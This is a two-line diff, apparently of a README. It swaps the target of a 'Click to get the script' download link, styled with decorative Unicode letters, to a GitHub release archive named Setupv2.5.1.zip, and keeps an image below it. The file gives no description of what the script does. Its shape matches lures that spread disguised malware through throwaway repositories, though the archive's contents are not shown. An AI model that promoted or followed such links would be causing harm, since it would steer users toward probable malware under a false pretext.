@@ -1,6 +1,6 @@
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.pro/)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/Lucasvdcngs/afaf/releases/download/Download/Setupv2.5.1.zip)***
 
 ![sddefault](https://github.com/user-attachments/assets/51c589ad-4aa9-48ce-99c0-bdf7e5d220a6)
 
